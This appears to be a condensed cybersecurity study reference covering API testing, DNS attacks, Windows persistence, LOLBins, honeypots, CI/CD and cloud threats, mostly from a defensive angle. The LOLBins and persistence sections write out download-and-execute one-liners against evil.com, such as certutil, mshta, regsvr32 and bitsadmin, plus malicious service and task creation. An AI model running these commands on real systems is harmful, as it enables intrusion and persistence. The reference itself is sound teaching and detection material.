API security testing methodology: systematic assessment of API security; REST, GraphQL, SOAP, gRPC interfaces. Reconnaissance: API discovery: review documentation (Swagger/OpenAPI spec if available); spider application; find JavaScript files for API endpoint references; common paths (/api, /api/v1, /api/v2, /v1, /rest); Wayback Machine: historical API endpoints; JS files: extract endpoints from React/Angular/Vue bundles; api-miner tool; Postman collections: if public; authentication: identify authentication mechanism: JWT, OAuth, API key, session cookie, basic auth, mTLS. Authentication testing: API key: test without key; test with empty key; test with invalid key; brute force rate limiting; test key in different locations (header, query string, body); JWT: decode payload (jwt.io); check algorithm (none attack; RS256 to HS256 algorithm confusion); signature verification; expiry enforcement; claim manipulation (change user_id, role, admin); OAuth: test redirect_uri manipulation; state parameter validation; scope bypass; code injection; basic auth: brute force; credential spraying. Authorization testing: IDOR (Insecure Direct Object Reference): change object IDs in requests; access other users resources; test all resource endpoints systematically; BOLA (Broken Object Level Authorization): OWASP API Security Top 10 #1; access object you do not own; privilege escalation: lower role calling higher privilege API function; horizontal: user A accessing user B data; BFLA (Broken Function Level Authorization): calling admin functions with non-admin credentials; mass assignment: send extra fields in request body; can you set admin=true, role=admin, credits=10000; test all writable endpoints with unexpected fields. Input validation testing: injection: SQL injection in all string parameters; command injection; SSRF via URL parameters; XXE in XML body; SSTI in template fields; regex DoS (ReDoS) in pattern-validated fields; excessive data exposure: API returns more data than needed; client filters; inspect response for sensitive fields; business logic: test ordering of operations; negative values; exceed limits; race conditions. Tools: Burp Suite: essential; intercept, replay, intruder (brute force); Postman: API testing client; organize requests; environment variables; Newman: Postman CLI for automation; REST-Assured (Java): automated API testing; OWASP ZAP: API scanner; active scan on API endpoints; Dredd: API specification conformance testing (OpenAPI); kiterunner: API endpoint discovery and wordlist attack; APIFuzzer: automated API fuzzing; Nuclei templates: API security checks; Swagger/OpenAPI import to test all defined endpoints; ffuf: fuzzing API parameters and values.
What is DNS security and DNSSEC?

DNS security: protect domain name resolution from poisoning, hijacking, and information disclosure; DNSSEC adds cryptographic integrity. DNS attack types: DNS cache poisoning (Kaminsky attack): inject false DNS records into resolver cache; redirect traffic to attacker IP; Kaminsky attack (2008): exploit predictable transaction IDs and port numbers; resolver sends recursive query; attacker floods with fake responses; if attacker response matches source port and transaction ID before real response: cache poisoned; fix: randomise source port + transaction ID (entropy); DNS hijacking: compromise DNS registrar account; change NS records; all DNS traffic redirected; protect registrar with MFA; registry lock; DNS amplification DDoS: DNS ANY query returns large response; spoof victim IP; DNS server sends large response to victim; amplification factor 50-100x; prevention: response rate limiting (RRL) on DNS server; BCP38 (block spoofed source IPs at ISP); DNS tunneling: encode data in DNS queries; bypass firewall; C2 channel over DNS; detection: high query volume, high-entropy subdomains, unusual query types; DNS rebinding: browser same-origin policy bypass; attacker controls domain; first DNS response: public IP (attacker server); browser loads page; second DNS response: private IP (internal server); browser makes requests to internal network via attacker page; DNSSEC: provides: data origin authentication (signed by zone owner), data integrity (detect tampering), authenticated denial of existence (NSEC/NSEC3 proves name does not exist); does not provide: confidentiality, DDoS protection; how it works: zone owner signs DNS records with private key; validator checks signature against public key (DNSKEY record); chain of trust from root to TLD to zone; DNSSEC record types: RRSIG (resource record signature), DNSKEY (public key), DS (delegation signer: hash of child zone DNSKEY in parent zone), NSEC/NSEC3 (authenticated denial); deployment: configure on authoritative DNS server (Bind, PowerDNS); sign zone; publish DS record in parent zone; enable DNSSEC validation on recursive resolvers; limitations: operational complexity: key management, rollover process; does not prevent DNS hijacking at registrar level (KSK must be secure); amplification: DNSSEC responses larger (used in amplification attacks); partial deployment: not all zones signed; DoT/DoH (DNS over TLS/HTTPS): encrypt DNS queries; prevent eavesdropping on DNS traffic; protect query privacy; DoT: TCP 853; DoH: HTTPS port 443; implementation: stubby, dnscrypt-proxy; corporate: DNS firewall (RPZ: Response Policy Zones): block malicious domains at DNS level; Cisco Umbrella, Palo Alto DNS Security, Infoblox: cloud DNS security filtering.
What is post-exploitation persistence in Windows?

Windows persistence: attacker mechanisms to maintain access after initial compromise; survive reboots, log-outs, and detection attempts. Registry run keys: HKCU\Software\Microsoft\Windows\CurrentVersion\Run: executes on user login; does not require admin; HKLM\Software\Microsoft\Windows\CurrentVersion\Run: executes for all users; requires admin; Autoruns (Sysinternals): comprehensive view of all run locations; best tool for persistence hunting; RunOnce: execute once then deleted; Winlogon: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon: Userinit and Shell values; replace or append; executes on login. Scheduled tasks: schtasks /create /sc onlogon /tn TaskName /tr C:\malware.exe: executes on any login; SYSTEM-level tasks: most privileged; COM hijacking via scheduled tasks; detection: schtasks /query /fo LIST /v; Autoruns; Event ID 4698 (scheduled task created), 4702 (modified). Services: create new service: sc create EvilService binPath=C:\evil.exe start=auto; service starts on boot; difficult to notice among hundreds of legitimate services; modify existing: change service binary path; suspicious: service with no description, unusual path, unusual account. DLL hijacking: place malicious DLL in directory searched before legitimate DLL location; application loads malicious DLL instead; persistence via application that runs on startup; search order: application directory, PATH directories. Startup folder: C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup: per-user; no admin; C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup: all users; admin required; place malicious executable or shortcut (LNK). WMI subscriptions: persistent WMI event subscription; Event Filter + Event Consumer + Binding; triggers on: user login, process creation, scheduled interval; stored in WMI repository (C:\Windows\System32\wbem\Repository); harder to detect than registry; detection: Get-WMIObject -Namespace root\subscription -Class __EventFilter; PowerShell Empire uses WMI for persistence. COM object hijacking: per-user HKCU COM registrations override machine HKLM: create HKCU\Software\Classes\CLSID\{GUID}; application loads HKCU version (attacker DLL) instead of HKLM version (legitimate); Autoruns: show COM hijacking opportunities. Active Directory persistence: Golden ticket: KRBTGT hash compromise; forge TGTs; AdminSDHolder modification: modify AdminSDHolder; propagated to protected groups; backdoor admin access; SID History: add SID to account SID history; inherits permissions of old SID (domain admin); DSRM password: local admin on every DC; if set and enabled remotely: persistent DC access. Detection across all: Autoruns: run at regular intervals; compare to previous baseline; alert on new entries; Event log hunting: 4697 (service installed), 4698/4702 (scheduled task), 7045 (new service); EDR: file creation in suspicious paths; registry modifications; WMI subscription creation; UEBA: user account active at unusual hours (persistence).
What is vulnerability scanning and assessment?

Vulnerability scanning: automated discovery of known vulnerabilities in systems, applications, and network infrastructure. Types: network scanning: discover open ports and running services; identify vulnerable service versions; match against CVE database; external scan: attacker perspective from internet; internal scan: from inside network; authenticated scan: credentials provided; scanner logs in; deep inspection of installed software, patch status, configuration; unauthenticated scan: no credentials; slower; misses software inventory; detects service-level vulns. Web application scanning: DAST scanner tests running web application; sends attack payloads; observes responses; identifies: XSS, SQL injection, CSRF, authentication issues, server misconfigurations; tools: OWASP ZAP, Burp Suite (Pro automated scan), Nikto (lightweight), Acunetix, Invicti, HCL AppScan. Network/infrastructure scanners: Nessus (Tenable): most widely used; 200,000+ plugins; authenticated and unauthenticated; compliance checks; Qualys: cloud-based; agent or scanner; continuous assessment; OpenVAS (Greenbone): open-source Nessus alternative; good for budget-constrained; Rapid7 Nexpose/InsightVM: VM with asset risk score; Tenable.io: cloud platform; agent-based for endpoints. Container scanning: Trivy (Aqua Security): scan container images; OS packages, language libraries, misconfigurations, secrets; Snyk Container: registry scanning and CI/CD integration; Clair (Red Hat): container image vulnerability analysis; Docker Scout: integrated in Docker Desktop; Anchore: policy-based container scanning; scan in CI/CD: fail pipeline if critical vulnerability in base image. IaC scanning: Checkov: Terraform, CloudFormation, Kubernetes manifests; KICS (Checkmarx): infrastructure as code security; tfsec: Terraform-focused; policies as code; fail pipeline before deploying misconfigured infrastructure. Scan scheduling: continuous asset scanning: weekly or more for perimeter assets; quarterly for internal; critical systems: more frequent; after changes: scan after configuration changes or deployments; finding: remediation workflow: critical (CVSS 9+): 24-48 hours; high (7-8.9): 7 days; medium (4-7): 30 days; low: 90 days; exception process: formal exception with risk acceptance, owner, review date; vulnerability management lifecycle: discover, prioritise, remediate, verify (rescan), report. Scan credentialing: provide credentials for deeper scan; Windows: domain admin or local admin; Linux: root or sudo capable account; database: read-only DBA account; network devices: read-only admin; protect scan credentials: dedicated scan accounts; rotate regularly; limit to scan servers only by firewall ACL.
What are living-off-the-land binaries (LOLBins)?

LOLBins (Living Off the Land Binaries): legitimate system binaries abused by attackers to execute code, download payloads, evade detection; no custom malware needed. Why LOLBins effective: signed by Microsoft: trusted by OS and AV; whitelisted by most application control solutions; common system processes: less anomalous in process trees; difficult to block without breaking legitimate functionality; categorisation: execute arbitrary code, download payloads, bypass UAC, dump credentials, evade defences. Key Windows LOLBins: certutil.exe: intended for certificate management; abuse: decode base64: certutil -decode malicious.b64 malicious.exe; download file: certutil -urlcache -split -f http://evil.com/malware.exe malware.exe; detection: certutil with -urlcache flag; mshta.exe: Microsoft HTML Application Host; executes.hta files (HTML Applications); abuse: mshta http://evil.com/evil.hta (downloads and executes HTA); mshta javascript:... (executes inline JavaScript); regsvr32.exe: register COM components; abuse: regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll; Squiblydoo technique; executes remote COM scriptlet; wscript.exe/cscript.exe: Windows Script Host; executes VBS, JS; abuse: delivered via email attachment; rundll32.exe: loads DLLs and executes functions; abuse: rundll32 javascript:...,RunHTMLApplication; loads malicious DLL; powershell.exe: see PowerShell entry; bitsadmin.exe: Background Intelligent Transfer Service; abuse: bitsadmin /transfer job /download http://evil.com/evil.exe C:\evil.exe; deprecated but still available; BITSjobs persist across reboots (persistence); msiexec.exe: Windows Installer; abuse: msiexec /q /i http://evil.com/malware.msi; executes remote MSI package; installutil.exe:.NET installer; abuse: installutil /logfile= /logtoconsole=false /u malware.exe; executes code in AllowedToRun or Uninstall method; bypasses AppLocker execution policy; wmic.exe: WMI command line; abuse: wmic process call create calc.exe; remote execution: wmic /node:TARGET process call create malware.exe; forfiles.exe: execute commands on files matching criteria; cmd.exe and PowerShell: obvious but with obfuscation (for/F loops, set variable tricks, environment variable manipulation). Detection: Sysmon Event 1 (process creation) with full command line; alert on: certutil -urlcache, mshta http://, regsvr32 /i:http://, rundll32 javascript; LOLBAS project (lolbas-project.github.io): comprehensive database of all LOLBins with techniques and detection; Sigma rules: community detection rules for LOLBin abuse available on GitHub.
What is file integrity monitoring (FIM)?

FIM (File Integrity Monitoring): detect unauthorised changes to critical system files; indicator of compromise or configuration drift. How FIM works: baseline: hash critical files (MD5, SHA-256); record hash, permissions, timestamps, owner; periodic or real-time monitoring: re-hash files; compare to baseline; alert on: hash change (file content modified), permission change, owner change, new file in monitored directory, deleted file. Critical paths to monitor: Linux: /etc/passwd, /etc/shadow, /etc/sudoers, /etc/hosts, /etc/crontab, /etc/cron.*, /var/spool/cron/, /etc/ssh/sshd_config, /etc/pam.d/, /bin, /sbin, /usr/bin, /usr/sbin, web server document root (/var/www/html), application configs (/etc/nginx/, /etc/apache2/), SSH authorised_keys; Windows: Windows system files (C:\Windows\System32), registry hives (Software\Microsoft\Windows\CurrentVersion\Run), host file (C:\Windows\System32\drivers\etc\hosts), boot sector, IIS web root, application configs. Tools: AIDE (Advanced Intrusion Detection Environment): open-source; Linux; baseline + periodic comparison; configure rules for which files/attributes to check; Tripwire Enterprise: commercial; real-time; comprehensive; Samhain: open-source; stealthy (stores DB on remote host); real-time and batch; Wazuh (OSSEC): SIEM + FIM; agent-based; real-time; Windows and Linux; OSSEC: open-source predecessor; Qualys FIM: cloud-based; CrowdStrike Falcon FIM module; SentinelOne FIM; SIEM integration: FIM alerts fed to SIEM; correlate with: login events (who was logged in when file changed?), process events (which process changed the file?), network events (was there inbound connection before change?). Real-time vs batch: real-time: immediate alert; kernel-level hooks (inotify on Linux); higher overhead; detects ephemeral changes; batch: periodic scan (every hour); lower overhead; may miss changes that were reverted; PCI DSS requirement 11.5: critical files monitored by FIM; alerts on change; regulatory: FIM is explicit requirement in PCI DSS, HIPAA, SOX. False positive management: software updates cause many alerts; use change management: before patching: whitelist expected changes in FIM; after patching: review remaining alerts; package manager integration: track which files should change during updates; scheduled maintenance window: suppress non-critical alerts during approved maintenance.
What is a pentest report structure and findings communication?

Penetration test report: primary deliverable; communicate findings, risks, and recommendations to technical and executive audiences. Report structure: executive summary: 1-2 pages; non-technical; key findings summary; overall risk rating; critical findings brief description; business impact; recommended priorities; written for: CISO, CEO, board; avoid technical jargon; tell the story of what was found and what it means for business. Scope and methodology: testing scope (systems, applications, dates, restrictions); testing methodology (OWASP Testing Guide, PTES, NIST); limitations (what was not tested); testing credentials and accounts used; tester information. Findings summary: risk rating distribution table (Critical: X, High: X, Medium: X, Low: X, Informational: X); risk heat map; severity over time (if retesting previous findings); CVSS score distribution. Technical findings: each finding contains: title (descriptive: SQL Injection in Login Endpoint, not SQL Injection); risk rating (Critical/High/Medium/Low/Informational); CVSS score (v3.1 vector and base score); affected systems/components; description (what is the vulnerability?); evidence (screenshots, command output, HTTP requests and responses); impact (what can attacker do? Data accessed, system compromised?); likelihood (how easy to exploit? Prerequisites?); remediation recommendation (specific, actionable: parameterised queries, not just fix SQL injection); references (OWASP, CWE, CVE); finding severity: Critical: immediate exploitation, critical data access, full system compromise, no authentication required; High: significant data access or compromise with low complexity; Medium: limited scope or requires specific conditions; Low: minimal impact or very complex exploitation; Informational: best practice recommendations, no direct vulnerability. Attack narrative (optional but valuable): story of how tester moved from initial access to highest-privilege access; shows attack chain; demonstrates cumulative risk of findings that individually seem low risk; executive-friendly: this is how an attacker could compromise your organisation. Recommendations summary: prioritised roadmap; quick wins (low effort, high impact); strategic improvements; remediation timelines; retesting recommendations. Report writing best practices: clear and specific: bad: The application is vulnerable to SQL injection; good: The login form at /login is vulnerable to SQL injection in the username parameter; allowing extraction of all users credentials including password hashes; evidence: every finding must have evidence (screenshot or request/response); actionable remediation: bad: sanitise user input; good: use parameterised queries (prepared statements) for all database queries. Example: Python: cursor.execute(SELECT * FROM users WHERE username=%s AND password=%s, (username, password)); avoid string concatenation; executive communication: translate technical findings to business risk: finding: SQL injection extracting user credentials; business impact: customer data breach; regulatory fine up to 4% annual revenue (GDPR); reputational damage.
What is cross-site tracing (XST)?

Cross-Site Tracing (XST): exploit HTTP TRACE method to steal cookies marked HttpOnly; bypasses HttpOnly protection; largely mitigated in modern browsers. How it works: HTTP TRACE: debugging method; server echoes entire request back to client including all headers; exploit: attacker page executes XMLHttpRequest with TRACE method to origin; response includes request headers including Cookie header; attacker JavaScript reads Cookie header from response; bypasses HttpOnly flag (HttpOnly prevents JS document.cookie access but not header echo); result: attacker reads HttpOnly session cookie. Current status: modern browsers block TRACE cross-origin; XMLHttpRequest blocked for TRACE from different origin; all major browsers (Chrome, Firefox, Safari, IE) block XST since 2008; but: legacy applications, custom HTTP clients, non-browser clients still at risk. Mitigation: disable HTTP TRACE on web servers: Nginx: if ($request_method = TRACE) { return 405; }; Apache: TraceEnable Off (in httpd.conf); IIS: disable TRACE in request filtering; test: curl -X TRACE http://target.com/ (should return 405 Method Not Allowed); verify: if TRACE returns 200 with echoed request: vulnerable; additional context: historical significance: OWASP Top 10 2003 and 2004 included XST; now less prominent as browsers mitigated; still relevant for: custom HTTP implementations, API clients, legacy systems, microservices with internal TRACE exposed.
What is the MITRE ATT&CK Navigator?

ATT&CK Navigator: web-based visualisation tool for MITRE ATT&CK framework; create, annotate, and share ATT&CK matrices. Core functionality: visualise ATT&CK matrix (Enterprise, Mobile, ICS); colour-code techniques; layer-based annotation; share and compare layers; use cases: defensive coverage mapping: colour green = controls in place; red = gap; identify coverage gaps visually; threat actor profiling: colour techniques used by specific APT (from ATT&CK group profiles); visualise actors TTPs; red team planning: mark techniques in red team exercise plan; track what was executed; SOC coverage: map SIEM detection rules to techniques; identify detection blind spots; purple team: red team layer (what was tested) + blue team layer (what was detected) = visualise gaps. Layer operations: create layer: import JSON or build manually in UI; export: JSON (shareable, version-controlled), Excel, SVG image; layer operations: multi-layer: overlay multiple layers; score: apply numeric score to technique (coverage level 0-3); comment: document reasoning per technique; filter: filter by tactic, technique, data source; compare: compare two layers (identify differences). Practical workflow: threat intel layer: use ATT&CK group pages; G0016 (APT28) has associated techniques; export layer; visualise in Navigator; defensive layer: map all SIEM rules, EDR controls to ATT&CK techniques; gap analysis: overlay threat intel layer on defensive layer; techniques with threat actor coverage but no defensive coverage = priority gaps; automated: tools generate Navigator layers: Vectr, Tidal Cyber, Picus Security, DeTT&CT; DeTT&CT: Defence Tactics Techniques and CTI; generates data source and detection coverage layers; ATT&CK Workbench: custom ATT&CK knowledge base; add custom techniques; hosted version at attack.mitre.org/versions/v14/; JSON export for integration with SIEM and other tools.
What is cyber deception and honeypot deployment?

Honeypot: decoy system designed to attract attackers; detect intrusion; gather intelligence; waste attacker time. Honeypot types by interaction: low-interaction: simulate services (open ports respond; no full OS); Honeyd: simulate multiple OS on single host; OpenSSH honeypot responds to SSH connection but does not provide real shell; limited attacker actions; easy to deploy; less intelligence; medium-interaction: more realistic service simulation; Dionaea (malware collector): simulates vulnerable services; captures exploit attempts and malware payloads; Conpot (ICS/SCADA honeypot): simulates industrial protocols; high-interaction: real OS with real services; attacker gets genuine shell; maximum intelligence; higher risk (attacker may pivot from honeypot); Cowrie: SSH/Telnet honeypot; full fake shell; logs all attacker commands; credential logging; captures binaries; highly popular; isolated from real network. Honeynet: network of honeypots; simulate entire vulnerable network segment; capture lateral movement behaviour; multi-stage attack observation; Honeynet Project (research organisation): provides tools and research. Deployment considerations: network placement: internet-facing honeypot: observe external attacker techniques; internal honeypot: detect insider threats and lateral movement after perimeter breach; production vs research: production: detect attacks on your organisation (internal; alert-generating); research: study attacker behaviour (internet-facing; not connected to internal network); isolation: honeypot should be isolated from production; if attacker escapes honeypot: should not reach real systems; monitoring: all honeypot traffic logged; alerts on any connection; SIEM integration. Cowrie deployment: pip install cowrie; configure simulated hostname, filesystem; fake credentials (capture what attackers try); listen on port 22 or redirect from port 22; logs: cowrie.json (structured); session logs; downloaded file captures; analyse: what commands do attackers run? What credentials tried? What malware uploaded? Threat intelligence from honeypots: credential brute-force attempts: reveal password spray patterns; attacker tools: malware deposited in honeypot; analyse; C2 infrastructure: malware connects to C2; capture C2 IPs and domains; new exploits: observe novel exploitation attempts; share intelligence: MISP, OTX, FS-ISAC sharing communities. Active defence: legal considerations: honeypots: generally legal (collecting intelligence on own systems); hackbacks: illegal in most jurisdictions; tarpit: slow attacker down (waste attacker time); legal under own network; attribution: honeypot data helps attribute attacks (consistent tooling, infrastructure, TTPs).
What is SAST versus DAST versus IAST?

Application security testing types: SAST (static), DAST (dynamic), IAST (interactive); each finds different vulnerability classes; complement each other. SAST (Static Application Security Testing): analyse source code, bytecode, or binary without executing; finds vulnerabilities in code before runtime; white-box testing; advantages: early in SDLC (shift left; find before deploy); covers all code paths (not just tested paths); developer feedback in IDE; detailed remediation (exact line of code); disadvantages: high false positive rate (code may be fine at runtime); cannot detect runtime issues; language-specific (Java SAST tool does not scan Python); misses configuration issues; tools: commercial: Checkmarx, Veracode, Fortify (Micro Focus), SonarQube (partial), Codacy; open-source: Semgrep (multilanguage, custom rules), CodeQL (GitHub; query-based; powerful), Bandit (Python), SpotBugs (Java), FindSecBugs, Brakeman (Ruby on Rails). DAST (Dynamic Application Security Testing): test running application from outside; black-box testing; sends HTTP requests; observes responses; advantages: finds runtime issues missed by SAST; no source code required; low false positives (issues confirmed executable); finds: XSS, SQL injection, CSRF, auth issues, misconfigurations; disadvantages: cannot test code not reached (low coverage vs SAST); misses logical vulnerabilities; slower (must deploy and test); cannot find most cryptographic issues; requires running environment; tools: OWASP ZAP (open-source; most widely used DAST), Burp Suite (manual + automated scan), Nikto (lightweight; quick), Acunetix, Invicti, HCL AppScan, StackHawk (CI/CD DAST). IAST (Interactive Application Security Testing): instrument application with agent; test dynamically; agent monitors code execution; advantages: runtime context: knows exactly which code executed; lower false positives than SAST; finds vulnerabilities DAST cannot see (code-level); real-time: finds issues as tests run; works with automated test suite (no separate scan needed); disadvantages: agent overhead; language-specific; requires integration with test suite; tools: Contrast Security: strongest IAST; Seeker (Synopsys); Checkmarx CxIAST; Hdiv Security. RASP vs IAST: IAST: security testing (find issues); RASP: security runtime protection (prevent exploitation); both use instrumentation; different purpose. Choosing: use all three for comprehensive coverage; SAST early in CI/CD pipeline on code commit; DAST after deployment to staging; IAST integrated with functional test suite; prioritise SAST + DAST minimum; IAST adds coverage for teams with mature practices.
What is advanced persistent threat (APT) techniques in cloud environments?

APT in cloud: sophisticated threat actors targeting cloud infrastructure; long dwell time; specific techniques for cloud environments. Initial access: phishing targeting cloud credentials (Google Workspace admin, Microsoft 365 admin, AWS console); credential stuffing against cloud portals; supply chain compromise affecting cloud tenant; public exposure: internet-facing S3 buckets, open management ports (EC2 with port 22/3389 open), misconfigured Kubernetes API server; developer credential exposure: AWS access key in public GitHub repository; OAuth token in mobile app; persistence: IAM backdoor: create additional IAM user or access key; survives password changes; conditional: create access key that only activates if primary deleted; Lambda backdoor: modify existing Lambda function; adds persistence code; harder to detect than new Lambda; CloudFormation: add resource to existing stack; CloudTrail disable: DeleteTrail or StopLogging (if IAM permissions allow); resource policy: modify S3, Lambda, or IAM role policy to allow external access; privilege escalation: IAM privilege escalation paths (see AWS pentest entry); cross-account role assumption: if misconfigured cross-account trust; assume external roles; SCP bypass: find child account without tight SCP; pivot via organisation trust. Lateral movement: cross-account access: assume roles in other accounts in AWS Organisation; shared VPC: move between workloads sharing VPC; credentials in SSM Parameter Store or Secrets Manager: retrieve credentials stored for applications; EC2 instance connect: if IAM allows ec2-instance-connect:SendSSHPublicKey: push SSH key to any EC2; connect as any user; Kubernetes lateral movement: service account tokens: high-privilege service accounts allow cross-namespace access; metadata pivot: reach EC2 instance metadata from pod; cloud to on-premises: VPN or Direct Connect from cloud to on-premises; if access to cloud network: reach on-premises segments. Detection: CloudTrail: all API calls logged; anomaly detection: unusual API calls, calls from unusual regions, calls at unusual hours, new access key creation, IAM policy changes, CloudTrail disable attempt; GuardDuty: ML-based anomaly detection; alerts: credential exfiltration, anomalous S3 access, unusual API calls, mining activity; Macie: sensitive data in S3 access patterns; UEBA: user behaviour analytics on IAM user actions.
What is security in CI/CD pipelines?

CI/CD pipeline security: integrate security controls throughout continuous integration and deployment; prevent insecure code or infrastructure from reaching production. Pipeline threat model: code injection: attacker-controlled code in pipeline (supply chain attack via dependency, compromised developer account, PR injection); credential theft: secrets stored in environment variables or logs; pipeline configuration tampering: modify.github/workflows or Jenkinsfile; lateral movement: pipeline with broad cloud permissions; attackers compromise pipeline for cloud access; insecure deployment: vulnerable code deployed without security check. Security controls by stage: pre-commit: hooks: detect-secrets, git-leaks, trufflehog (scan for secrets before commit); IDE plugins: SonarLint, Semgrep (real-time feedback); developer workstation: full disk encryption, MFA, EDR. Commit/push: branch protection: protected main branch; require PR review before merge; no force push; signed commits: GPG signing; verify author identity; CODEOWNERS: security team review required for security-sensitive paths (.github/workflows, IAM configs, security configs). Pull request: SAST: Semgrep, CodeQL, Checkmarx (scan code changes); SCA: Snyk, Dependabot (dependency vulnerabilities); IaC scanning: Checkov, tfsec (Terraform security); secret scanning: GitHub Advanced Security, GitLab secret detection; code review: security checklist; OWASP Top 10 per language. Build: signed artifacts: sign build output (Sigstore, in-toto); provenance attestation; SBOM generation (Syft, CycloneDX); container image scanning: Trivy, Snyk Container; scan base image + application layers; dependency hash verification: verify hashes match expected (npm lockfile, pip hash check); ephemeral build environment: fresh environment per build; no persistent secrets. Test: DAST: OWASP ZAP, StackHawk; test running application in staging; infrastructure security testing: AWS Security Hub, Prisma Cloud; compliance checks: ensure deployment meets compliance requirements. Deployment: secrets management: Vault, AWS Secrets Manager, Azure Key Vault; never in environment variables or code; least-privilege deployment credentials: pipeline role has only deploy permissions, not admin; deployment gates: manual approval for production; require sign-off; canary deployment: gradual rollout; detect issues before full deployment. Runtime: CWPP: monitor deployed workloads; CSPM: cloud configuration compliance; production monitoring: anomaly detection, SIEM integration; automated rollback: detect runtime anomaly; trigger rollback. Pipeline hardening: restrict who can modify pipeline config (.github/workflows); audit pipeline changes; no self-hosted runners with broad access (or strictly control self-hosted runners); ephemeral runners (GitHub Actions hosted, AWS CodeBuild): no persistence; rotate credentials: pipeline credentials rotated regularly; principle of least privilege: pipeline role has only what it needs.
What is a security baseline and configuration hardening standard?

Security baseline: minimum security configuration standard; applied consistently across systems; reduces attack surface; measured and enforced. Why baselines: ad hoc hardening: each admin applies different settings; inconsistent; audit failures; security gaps; standardised baseline: repeatable, auditable, consistent; reduces human error; enables automated compliance checking.
